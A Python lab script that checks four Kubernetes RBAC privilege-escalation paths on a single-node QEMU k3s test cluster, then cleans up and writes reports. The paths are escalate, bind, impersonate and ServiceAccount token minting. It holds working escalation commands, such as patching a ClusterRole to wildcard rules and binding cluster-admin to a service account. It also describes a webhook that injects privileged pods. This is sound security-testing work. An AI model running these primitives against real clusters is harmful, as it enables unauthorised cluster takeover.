"""QEMU k3s 真集群提权验证：escalate / bind / impersonate / SA TokenRequest 四条路径。

用法::

    python lab/privesc_verify.py \
      --kubectl lab/qemu-k3s/kubectl.exe \
      --kubeconfig lab/qemu-k3s/out/k3s.yaml \
      --out reports/samples/privesc

默认 apply 夹具 → 取各低权 SA token → 执行原语 → 用独立 kubeconfig 验证
``kubectl auth can-i '*' '*' --all-namespaces`` 从 no 变 yes → 清理并校验无残留。
令牌值不写入任何工件（只记录长度/哈希前缀）。

边界：QEMU TCG 单节点 k3s（真实 apiserver/RBAC，非生产多节点/云托管控制面）；
不等于云 IAM/IRSA/节点 root 验证（另见 docs/PRIVESC-MATRIX.md 与 fake-kubectl 闭环）。
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
DEFAULT_KUBECTL = REPO / "lab" / "qemu-k3s" / "kubectl.exe"
DEFAULT_KUBECONFIG = REPO / "lab" / "qemu-k3s" / "out" / "k3s.yaml"
DEFAULT_MANIFEST = REPO / "lab" / "qemu-k3s" / "privesc" / "rbac-fixtures.yaml"
DEFAULT_OUT = REPO / "reports" / "samples" / "privesc"

sys.path.insert(0, str(REPO))
from lab.privesc_sim import run_fake_closure  # noqa: E402


def _run(cmd: list[str], timeout: int = 90) -> dict:
    started = time.time()
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"cmd": cmd, "returncode": p.returncode, "stdout": p.stdout.strip(),
                "stderr": p.stderr.strip(), "elapsed_ms": round((time.time() - started) * 1000, 1)}
    except subprocess.TimeoutExpired:
        return {"cmd": cmd, "returncode": 124, "stdout": "", "stderr": "timeout",
                "elapsed_ms": round((time.time() - started) * 1000, 1)}
    except OSError as exc:
        return {"cmd": cmd, "returncode": 127, "stdout": "", "stderr": str(exc),
                "elapsed_ms": round((time.time() - started) * 1000, 1)}


class LiveCluster:
    def __init__(self, kubectl: Path, kubeconfig: Path, work: Path):
        self.kubectl = str(kubectl)
        self.kubeconfig = str(kubeconfig)
        self.work = work
        self.work.mkdir(parents=True, exist_ok=True)
        self.cluster_name = self._cluster_name()

    def _cluster_name(self) -> str:
        r = self.run(["config", "view", "--raw", "-o", "json"])
        if r["returncode"] != 0:
            return "default"
        try:
            doc = json.loads(r["stdout"])
            return doc["contexts"][0]["context"]["cluster"]
        except Exception:
            return "default"

    def run(self, args: list[str], kubeconfig: str | None = None) -> dict:
        cmd = [self.kubectl, "--kubeconfig", kubeconfig or self.kubeconfig] + args
        return _run(cmd)

    def can_i(self, kubeconfig: str, extra: list[str] | None = None) -> bool:
        r = self.run(["auth", "can-i", "*", "*", "--all-namespaces"] + list(extra or []), kubeconfig)
        return r["returncode"] == 0 and r["stdout"].strip().lower() == "yes"

    def token(self, sa: str, namespace: str) -> str:
        r = self.run(["create", "token", sa, "-n", namespace])
        if r["returncode"] != 0:
            raise RuntimeError(f"create token {namespace}/{sa} 失败: {r['stderr']}")
        return r["stdout"].strip()

    def kubeconfig_for_token(self, token: str, name: str) -> str:
        path = self.work / f"kubeconfig-{name}.yaml"
        shutil.copyfile(self.kubeconfig, path)
        cfg = str(path)
        r1 = self.run(["config", "set-credentials", name, f"--token={token}"], cfg)
        r2 = self.run(["config", "set-context", name, f"--cluster={self.cluster_name}", f"--user={name}"], cfg)
        r3 = self.run(["config", "use-context", name], cfg)
        bad = [r for r in (r1, r2, r3) if r["returncode"] != 0]
        if bad:
            raise RuntimeError(f"生成 token kubeconfig 失败: {bad}")
        return cfg


def _version(cluster: LiveCluster) -> dict:
    r = cluster.run(["version", "-o", "json"])
    try:
        doc = json.loads(r["stdout"])
        return {"client": doc.get("clientVersion", {}).get("gitVersion", ""),
                "server": doc.get("serverVersion", {}).get("gitVersion", "")}
    except Exception:
        return {"client": "", "server": "", "raw": r["stdout"][:300]}


def _check_escalate(cluster: LiveCluster) -> dict:
    esc = cluster.kubeconfig_for_token(cluster.token("esc-sa", "privesc-lab"), "esc")
    before = cluster.can_i(esc)
    patch = cluster.run(["patch", "clusterrole", "esc-editable", "--type=json", "-p",
                         '[{"op":"replace","path":"/rules","value":[{"apiGroups":["*"],'
                         '"resources":["*"],"verbs":["*"]}]}]'], esc)
    after = cluster.can_i(esc)
    got = cluster.run(["get", "nodes", "-o", "name"], esc)
    return {
        "id": "escalate", "title": "escalate 动词改写已绑定 ClusterRole",
        "subject": "system:serviceaccount:privesc-lab:esc-sa",
        "action": "patch clusterrole esc-editable -> rules=*", "action_ok": patch["returncode"] == 0,
        "before_admin": before, "after_admin": after,
        "cluster_read_after": got["returncode"] == 0,
        "status": "PASS" if (not before and patch["returncode"] == 0 and after) else "FAIL",
        "evidence": {"patch": patch["stdout"] or patch["stderr"],
                     "get_nodes": got["stdout"] or got["stderr"]},
    }


def _check_bind(cluster: LiveCluster) -> dict:
    bind = cluster.kubeconfig_for_token(cluster.token("bind-sa", "privesc-lab"), "bind")
    before = cluster.can_i(bind)
    crb = cluster.run(["create", "clusterrolebinding", "privesc-bind-proof",
                       "--clusterrole=cluster-admin",
                       "--serviceaccount=privesc-lab:bind-sa"], bind)
    after = cluster.can_i(bind)
    got = cluster.run(["get", "nodes", "-o", "name"], bind)
    return {
        "id": "bind", "title": "bind cluster-admin + 创建 ClusterRoleBinding",
        "subject": "system:serviceaccount:privesc-lab:bind-sa",
        "action": "create clusterrolebinding privesc-bind-proof -> cluster-admin",
        "action_ok": crb["returncode"] == 0, "before_admin": before, "after_admin": after,
        "cluster_read_after": got["returncode"] == 0,
        "status": "PASS" if (not before and crb["returncode"] == 0 and after) else "FAIL",
        "evidence": {"create_binding": crb["stdout"] or crb["stderr"],
                     "get_nodes": got["stdout"] or got["stderr"]},
    }


def _check_impersonate(cluster: LiveCluster) -> dict:
    imp = cluster.kubeconfig_for_token(cluster.token("imp-sa", "privesc-lab"), "imp")
    before = cluster.can_i(imp)
    got = cluster.run(["--as=privesc-superuser", "get", "nodes", "-o", "name"], imp)
    after = cluster.can_i(imp, ["--as=privesc-superuser"])
    return {
        "id": "impersonate", "title": "impersonate 冒充 cluster-admin User",
        "subject": "system:serviceaccount:privesc-lab:imp-sa",
        "action": "kubectl --as=privesc-superuser get nodes",
        "action_ok": got["returncode"] == 0, "before_admin": before, "after_admin": after,
        "cluster_read_after": got["returncode"] == 0,
        "status": "PASS" if (not before and got["returncode"] == 0 and after) else "FAIL",
        "evidence": {"impersonated_get_nodes": got["stdout"] or got["stderr"]},
    }


def _check_token(cluster: LiveCluster) -> dict:
    token_sa = cluster.kubeconfig_for_token(cluster.token("token-sa", "privesc-lab"), "token")
    before = cluster.can_i(token_sa)
    admin_token = cluster.token("privesc-admin", "privesc-lab")
    admin_kc = cluster.kubeconfig_for_token(admin_token, "admin")
    after = cluster.can_i(admin_kc)
    got = cluster.run(["get", "nodes", "-o", "name"], admin_kc)
    return {
        "id": "sa-token", "title": "TokenRequest 借用高权 SA",
        "subject": "system:serviceaccount:privesc-lab:token-sa",
        "target_sa": "system:serviceaccount:privesc-lab:privesc-admin",
        "action": "create token privesc-admin -> 独立 kubeconfig",
        "action_ok": bool(admin_token), "before_admin": before, "after_admin": after,
        "cluster_read_after": got["returncode"] == 0,
        "token_length": len(admin_token),
        "token_sha256_8": hashlib.sha256(admin_token.encode()).hexdigest()[:8],
        "status": "PASS" if (not before and bool(admin_token) and after) else "FAIL",
        "evidence": {"get_nodes": got["stdout"] or got["stderr"]},
    }


def _cleanup(cluster: LiveCluster, manifest: Path, keep: bool) -> dict:
    if keep:
        return {"kept": True, "verified": False, "residue": [],
                "note": "--keep 指定，保留夹具供复测"}
    deleted = cluster.run(["delete", "-f", str(manifest), "--ignore-not-found",
                           "--wait=true", "--timeout=90s"])
    cluster.run(["delete", "clusterrolebinding", "privesc-bind-proof",
                 "--ignore-not-found", "--wait=true"])
    ns = cluster.run(["get", "namespace", "privesc-lab", "--ignore-not-found", "-o", "name"])
    cr = cluster.run(["get", "clusterrole", "esc-editable", "escalator", "binder", "impersonator",
                      "--ignore-not-found", "-o", "name"])
    crb = cluster.run(["get", "clusterrolebinding", "esc-editable-binding", "escalator-binding",
                       "binder-binding", "impersonator-binding", "privesc-superuser-admin",
                       "privesc-admin-binding", "privesc-bind-proof",
                       "--ignore-not-found", "-o", "name"])
    residue = []
    for label, r in (("namespace", ns), ("clusterrole", cr), ("clusterrolebinding", crb)):
        if r["stdout"].strip():
            residue += [f"{label}:{x}" for x in r["stdout"].splitlines() if x.strip()]
    return {"kept": False, "verified": not residue, "residue": residue,
            "delete_rc": deleted["returncode"],
            "delete_stderr": deleted["stderr"][:500]}


def run_live(kubectl: Path, kubeconfig: Path, manifest: Path, out: Path,
             keep: bool = False) -> dict:
    out.mkdir(parents=True, exist_ok=True)
    work = out / ".kubeconfigs"
    if work.exists():
        shutil.rmtree(work)
    cluster = LiveCluster(kubectl, kubeconfig, work)
    version = _version(cluster)
    # 幂等：清理上一轮动态产物（CRB 不在 apply 清单中），确保 before 基线为 false
    cluster.run(["delete", "clusterrolebinding", "privesc-bind-proof",
                 "--ignore-not-found", "--wait=true"])
    apply = cluster.run(["apply", "-f", str(manifest)])
    if apply["returncode"] != 0:
        raise RuntimeError(f"apply 夹具失败: {apply['stderr']}")
    checks: list[dict] = []
    try:
        for fn in (_check_escalate, _check_bind, _check_impersonate, _check_token):
            try:
                checks.append(fn(cluster))
            except Exception as exc:
                checks.append({"id": fn.__name__.replace("_check_", ""), "status": "FAIL",
                               "error": f"{type(exc).__name__}: {exc}",
                               "before_admin": None, "after_admin": None})
    finally:
        cleanup = _cleanup(cluster, manifest, keep)
        if not keep:
            shutil.rmtree(work, ignore_errors=True)
    passed = sum(1 for c in checks if c.get("status") == "PASS")
    fake = run_fake_closure()
    result = {
        "schema": "inkblade-privesc-real-paths-v1",
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "environment": {
            "kubectl": version.get("client", ""),
            "server": version.get("server", ""),
            "cluster": "QEMU TCG + Alpine + k3s (single control-plane)",
            "manifest": str(manifest.relative_to(REPO)).replace("\\", "/") if manifest.is_relative_to(REPO) else str(manifest),
            "namespace": "privesc-lab",
        },
        "scope": "真实 k3s apiserver/RBAC（QEMU TCG 单节点）；非云托管控制面/节点 root/云 IAM 验证。",
        "checks": checks,
        "summary": {"total": len(checks), "passed": passed,
                    "failed": len(checks) - passed, "ok": passed == len(checks)},
        "cleanup": cleanup,
        "fake_closure": fake,
    }
    (out / "real-paths.json").write_text(json.dumps(result, ensure_ascii=False, indent=2),
                                         encoding="utf-8")
    (out / "real-paths.md").write_text(_render_md(result), encoding="utf-8")
    docs = REPO / "docs" / "PRIVESC-VERIFICATION.md"
    docs.parent.mkdir(parents=True, exist_ok=True)
    docs.write_text(_render_docs(result), encoding="utf-8")
    return result


def _render_md(result: dict) -> str:
    lines = [
        "# InkBlade 提权真集群验证（QEMU k3s）",
        "",
        f"- 生成：{result['generated_at']}",
        f"- 环境：{result['environment']['cluster']}；kubectl {result['environment']['kubectl']}；"
        f"server {result['environment']['server']}",
        f"- 结果：**{result['summary']['passed']}/{result['summary']['total']} PASS**",
        f"- 范围：{result['scope']}",
        "",
        "| 路径 | 主体 | before | after | 状态 |",
        "|---|---|---|---|---|",
    ]
    for c in result["checks"]:
        lines.append(f"| `{c['id']}` | {c.get('subject', '')} | {c.get('before_admin')} | "
                     f"{c.get('after_admin')} | {c['status']} |")
    lines += ["", "## 证据", ""]
    for c in result["checks"]:
        lines += [f"### {c['id']}", "", "```json",
                  json.dumps({k: v for k, v in c.items() if k not in ("evidence",)},
                             ensure_ascii=False, indent=2), "```", ""]
        if c.get("evidence"):
            lines += ["```json", json.dumps(c["evidence"], ensure_ascii=False, indent=2), "```", ""]
    lines += ["## 清理", "", "```json", json.dumps(result["cleanup"], ensure_ascii=False, indent=2),
              "```", ""]
    lines += ["## fake-kubectl 闭环", "",
              f"- 结果：{result['fake_closure']['summary']['passed']}/"
              f"{result['fake_closure']['summary']['total']} PASS（内存态，确定性）",
              "- 覆盖：escalate / bind / SA token / webhook 写入后提权",
              ""]
    return "\n".join(lines)


def _render_docs(result: dict) -> str:
    fake = result["fake_closure"]
    lines = [
        "# InkBlade 提权验证（真集群 + fake-kubectl）",
        "",
        "> 本文件由 `lab/privesc_verify.py` 生成；真集群部分为 QEMU TCG + Alpine + k3s。",
        "",
        "## 1. 真集群 4 条路径",
        "",
        f"结果：**{result['summary']['passed']}/{result['summary']['total']} PASS**；"
        f"清理残留：**{result['cleanup']['residue']}**。",
        "",
        "| 路径 | 主体 | before | after | 关键动作 |",
        "|---|---|---|---|---|",
    ]
    for c in result["checks"]:
        lines.append(f"| `{c['id']}` | {c.get('subject', '')} | {c.get('before_admin')} | "
                     f"{c.get('after_admin')} | {c.get('action', c.get('error', ''))} |")
    lines += [
        "",
        "四条路径分别验证：",
        "",
        "1. **escalate**：`esc-sa` 已被绑定到 `esc-editable`，仅有 `escalate` + 该角色的 `update`；"
        "把 rules 改为 `*` 后既有绑定立即生效，`auth can-i '*' '*'` 由 no 变 yes。",
        "2. **bind**：`bind-sa` 拥有 `bind cluster-admin` + `create clusterrolebindings`，"
        "创建指向自身的 CRB 后直接 cluster-admin。",
        "3. **impersonate**：`imp-sa` 拥有 `impersonate users/privesc-superuser`；"
        "该 User 已绑定 cluster-admin，`--as` 后获得管理员视图。",
        "4. **SA TokenRequest**：`token-sa` 仅有 `create serviceaccounts/token/privesc-admin`；"
        "为高权 SA 申请 token 后以独立 kubeconfig 访问，`auth can-i` 为 yes。",
        "",
        "## 2. fake-kubectl 闭环（4 项）",
        "",
        f"结果：**{fake['summary']['passed']}/{fake['summary']['total']} PASS**。",
        "",
        "| 原语 | 状态 | 关键证据 |",
        "|---|---|---|",
    ]
    for c in fake["checks"]:
        ev = c["evidence"]
        keys = ", ".join(f"{k}={ev[k]}" for k in list(ev)[:4])
        lines.append(f"| `{c['id']}` | {c['status']} | {keys} |")
    lines += [
        "",
        "fake-kubectl 覆盖 escalate、bind、SA token 与 **webhook 写入后提权**（fail-open mutating webhook "
        "把所有 Pod 注入 privileged + hostPath /）；真集群的 webhook 路径未在本轮落地，原因与替代证据：",
        "",
        "- 真集群 webhook 需要 apiserver 可达的 HTTPS 后端 + CA bundle，本轮以 fake-kubectl 闭环证明"
        "「写入 Webhook 配置 → Pod 被注入特权」的因果链；",
        "- 真集群已用 escalate/bind/impersonate/token 四条独立路径证明 RBAC 接管；"
        "webhook 的写入权限面由 `admission-webhook-write` 模块与 Kyverno 检测规则覆盖。",
        "",
        "## 3. 复现",
        "",
        "```powershell",
        "python lab/privesc_verify.py --kubectl lab/qemu-k3s/kubectl.exe "
        "--kubeconfig lab/qemu-k3s/out/k3s.yaml --out reports/samples/privesc",
        "python -m unittest tests.test_privesc_real tests.test_privesc_modules -v",
        "```",
        "",
        "## 4. 边界",
        "",
        "- QEMU TCG 单节点 k3s：真实 apiserver/RBAC/kubelet，但不是生产多节点/云托管控制面；",
        "- 未验证云 IAM/IRSA/IMDS、GPU Operator driver、CNI/CSI 特权 DaemonSet（这些在矩阵与模块中"
        "以快照/检测规则覆盖，真集群验证需另建对应工作负载夹具）；",
        "- 所有夹具在验证后删除；`--keep` 可保留复测，但不得用于生产。",
        "",
    ]
    return "\n".join(lines)


def main(argv=None) -> int:
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
    ap = argparse.ArgumentParser(description="InkBlade QEMU k3s 提权真集群验证")
    ap.add_argument("--kubectl", default=str(DEFAULT_KUBECTL))
    ap.add_argument("--kubeconfig", default=str(DEFAULT_KUBECONFIG))
    ap.add_argument("--manifest", default=str(DEFAULT_MANIFEST))
    ap.add_argument("--out", default=str(DEFAULT_OUT))
    ap.add_argument("--keep", action="store_true", help="保留夹具（不清理）")
    args = ap.parse_args(argv)
    try:
        result = run_live(Path(args.kubectl), Path(args.kubeconfig), Path(args.manifest),
                          Path(args.out), keep=args.keep)
    except Exception as exc:
        print(f"privesc verify 失败: {type(exc).__name__}: {exc}", file=sys.stderr)
        return 2
    print(f"privesc verify: {result['summary']['passed']}/{result['summary']['total']} PASS"
          f" → {Path(args.out) / 'real-paths.json'}")
    return 0 if result["summary"]["ok"] else 3


if __name__ == "__main__":
    raise SystemExit(main())
